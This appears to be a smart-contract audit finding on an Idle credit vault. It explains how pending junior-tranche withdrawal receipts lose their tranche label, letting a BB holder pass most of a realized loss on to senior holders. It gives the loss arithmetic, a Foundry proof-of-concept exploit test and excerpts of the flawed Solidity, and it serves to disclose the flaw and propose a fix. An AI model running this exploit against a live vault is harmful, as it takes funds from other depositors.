[1](#0-0) ### Title
Pending BB withdrawals escape first-loss treatment because receipts discard tranche identity - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary

`IdleCDOEpochVariant.requestWithdraw` authenticates the selected tranche when burning the user's AA or BB tokens, but forwards only scalar `_underlyings`, `_user`, and `principal` to `IdleCreditVault.requestWithdraw`; the receipt's tranche class is not persisted. [2](#0-1) [3](#0-2) [4](#0-3) 

`IdleCreditVault` then records the request only in aggregate `pendingWithdraws`, `withdrawsRequests`, and `withdrawsRequestsByEpoch`, with no AA/BB field. [5](#0-4) [6](#0-5) 

On a realized loss, `previewLossAdjustedWithdrawFunds` charges the aggregate pending bucket only `loss * pendingBasis / (activeBasis + pendingBasis)` and sends the remaining `activeLoss` through the active-position waterfall. [7](#0-6)  The CDO then burns `activeLoss` from active strategy tokens and updates tranche accounting. [8](#0-7) 

This is analogous to signing header values but not header names: the withdrawal amount is bound to the receipt, while the security-critical tranche label is discarded. A pending receipt created from BB is consequently treated as an unlabeled seniority-neutral claim instead of a first-loss claim.

### Finding Description

During the buffer phase, an unprivileged BB holder calls `requestWithdraw` for all BB tranche tokens. The CDO burns the BB tranche tokens and calculates an underlying claim, but the strategy stores only the amount and epoch—not the fact that the claim originated from the junior tranche. [9](#0-8) [6](#0-5) 

When the honest manager later recognizes a loss with `stopEpochWithDuration`, the pending BB receipt shares the pending-side loss pro rata with the entire active basis. [10](#0-9)  If tranche identity were preserved, a pending BB claim should absorb the loss before pending AA claims and before active AA NAV.

For example, with `A = 1000` active basis and `P = 100` pending BB basis, a loss of `100` produces `pendingLoss = 9.09`, `pendingToFund = 90.91`, and `activeLoss = 90.91`. The BB withdrawer receives `90.91`, even though preserving the BB label would make the `100` pending junior claim absorb the full `100` loss and pay zero.

The claim path then pays the loss-adjusted amount to the user from funded withdrawal reserves. [11](#0-10)  Existing guards do not prevent this because the request is allowed, receipt accounting is intentionally aggregate, and `previewLossAdjustedWithdrawFunds` explicitly has no tranche-specific pending-loss branch.

### Impact Explanation

This breaks the BB-first loss invariant. A BB holder can convert an active junior position into a generic pending receipt during the buffer, causing most of a subsequent loss up to the pending claim amount to be socialized into active LPs rather than fully absorbed by that BB claim.

With pending basis `P`, active basis `A`, and loss `L <= P`, the attacker escapes:

```text
escapedLoss = L - (L * P / (A + P))
            = L * A / (A + P)
```

For `A = 1000`, `P = L = 100`, the attacker escapes `90.91` units of first loss, receives those funds through `claimWithdrawRequest`, and leaves active tranche holders to absorb the corresponding NAV burn. If the attacker withdrew all BB capital, the resulting active loss can directly reduce senior NAV.

### Likelihood Explanation

Likelihood is medium. The attacker only needs to be a BB tranche holder and submit a withdrawal during the buffer; no privileged role, malformed transaction, oracle manipulation, or borrower collusion is required. The exploit becomes profitable whenever an honest owner or manager later calls the supported `stopEpochWithDuration` path with a nonzero realized loss.

### Recommendation

Persist tranche identity in withdrawal receipts instead of tracking only aggregate pending amounts. For example:

- Replace `withdrawsRequestsByEpoch[user][epoch]` with a per-epoch struct containing `aaAmount` and `bbAmount`.
- Track separate `pendingWithdrawsAA` and `pendingWithdrawsBB` bases.
- Apply realized losses to pending BB receipts first, then pending AA receipts, and only then to active positions through the existing waterfall.
- Preserve both amounts when a user requests withdrawals from AA and BB in the same epoch.
- Update default, recovery, APR0, and legacy-upgrade accounting so every receipt retains its original seniority until paid.

### Proof of Concept

The following Foundry test uses the existing `IdleCreditVault.t.sol` credit-vault fixture and helper names. It demonstrates that a BB request for `P` is funded after a loss of `P`, instead of being fully consumed as first-loss capital.

```solidity
// test/foundry/IdleCreditVault.t.sol
function testPendingBBReceiptEscapesFirstLoss() external {
    address senior = makeAddr("senior");
    address attacker = makeAddr("bb-attacker");

    uint256 activeAmount = 1_000 * ONE_SCALE;
    uint256 pendingAmount = 100 * ONE_SCALE;

    // Keep fee math out of the invariant assertion.
    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, 0);

    // Senior liquidity remains active.
    _depositWithUser(senior, activeAmount, true);

    // Attacker supplies junior capital, then converts it into an unlabeled
    // pending withdrawal receipt during the buffer.
    _depositWithUser(attacker, pendingAmount, false);
    uint256 attackerBB = IERC20(BBtranche).balanceOf(attacker);

    vm.prank(attacker);
    uint256 pendingBasis = cdoEpoch.requestWithdraw(attackerBB, address(BBtranche));
    assertEq(pendingBasis, pendingAmount);

    _startEpochAndCheckPrices(0);

    uint256 loss = pendingBasis;
    (uint256 pendingToFund, uint256 activeLoss) =
        IdleCreditVault(address(strategy)).previewLossAdjustedWithdrawFunds(loss);

    // With P == L, a tranche-aware waterfall should fully consume the pending
    // BB receipt. The aggregate accounting funds most of it instead.
    assertEq(pendingToFund + activeLoss, pendingBasis);
    assertGt(pendingToFund, 0);

    uint256 required =
        cdoEpoch.expectedEpochInterest() + pendingToFund;

    deal(defaultUnderlying, borrower, required);
    vm.prank(borrower);
    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), required);

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(
        initialProvidedApr,
        0,
        cdoEpoch.epochDuration(),
        loss
    );

    uint256 attackerBefore =
        IERC20Detailed(defaultUnderlying).balanceOf(attacker);

    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();

    uint256 received =
        IERC20Detailed(defaultUnderlying).balanceOf(attacker) - attackerBefore;

    // Expected under BB-first accounting: 0.
    // Actual under aggregate pending accounting: pendingToFund > 0.
    assertEq(received, pendingToFund);
    assertGt(received, 0);

    // The escaped amount was borne by active NAV through activeLoss.
    assertGt(activeLoss, 0);
}
```

Run it in the repository's existing credit-vault fixture:

```bash

  --match-test testPendingBBReceiptEscapesFirstLoss \
  --fork-url "$MAINNET_RPC" \
  -vv

  function previewLossAdjustedWithdrawFunds(uint256 _lossAmount) external view returns (uint256 pendingToFund, uint256 activeLoss) {
    uint256 pendingBasis = pendingWithdraws;
    // Full zero-loss funding is safe for legacy aggregate receipts and needs no migration call.
    if (_lossAmount == 0) return (pendingBasis, _lossAmount);

    IIdleCDOEpochVariant cdo = IIdleCDOEpochVariant(idleCDO);
    uint256 activeBasis = _lossActiveBasis(cdo);
    if (pendingBasis == 0) {
      if (_lossAmount > activeBasis) revert NotAllowed();
      return (0, _lossAmount);
    }

    // Legacy pending receipts do not have the per-epoch ownership data needed to store a haircut.
    if (!defaultRecoveryInitialized) revert NotAllowed();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (_lossAmount >= totalBasis) revert NotAllowed();

    uint256 pendingLoss = _lossAmount * pendingBasis / totalBasis;
    pendingToFund = pendingBasis - pendingLoss;
    activeLoss = _lossAmount - pendingLoss;
```

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
